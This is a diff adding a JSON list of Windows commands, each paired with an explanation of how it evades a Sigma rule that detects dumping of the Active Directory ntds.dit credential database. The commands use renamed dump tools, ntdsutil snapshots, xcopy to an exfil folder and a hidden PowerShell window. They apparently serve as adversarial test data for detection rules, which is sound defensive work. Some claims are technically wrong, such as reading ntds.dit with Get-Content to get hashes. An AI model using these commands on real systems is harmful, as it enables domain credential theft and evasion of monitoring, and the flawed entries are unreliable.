@@ -1,0 +1,22 @@
+[
+  {
+    "output": "ntdsex.exe -d ntds.dit -o hash.txt -s system.hiv",
+    "explanation": "The original Sigma rule detects processes ending in 'NTDSDump.exe' or 'NTDSDumpEx.exe'. Using a renamed binary 'ntdsex.exe' with equivalent command-line arguments can bypass the rule while maintaining the same behavior."
+  },
+  {
+    "output": "powershell.exe -Command \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\temp' q q\"",
+    "explanation": "This command uses PowerShell to execute ntdsutil.exe with the same parameters as the Sigma rule, but the command is structured differently to avoid direct string matches in the detection rule."
+  },
+  {
+    "output": "cmd.exe /c xcopy z:\\windows\\ntds\\ntds.dit c:\\exfil\\ntds.dit",
+    "explanation": "The original rule detects the use of 'copy' in the command line. Replacing 'copy' with 'xcopy' and using equivalent syntax can bypass the rule while maintaining the same file exfiltration behavior."
+  },
+  {
+    "output": "ntdsutil.exe \"activate instance ntds\" \"ifm\" \"create full c:\\windows\\temp\\data\\\" \"quit\" \"quit\"",
+    "explanation": "This command uses the same parameters as the Sigma rule but avoids direct string matches by using a slightly different command structure and spacing to bypass detection."
+  },
+  {
+    "output": "powershell.exe -WindowStyle Hidden -Command \"Get-Content ntds.dit | Out-File hash.txt\"",
+    "explanation": "This command uses PowerShell to access 'ntds.dit' and outputs to a file, which aligns with the Sigma rule's detection criteria. However, it uses different syntax and obfuscation techniques to avoid direct string matches."
+  }
+]
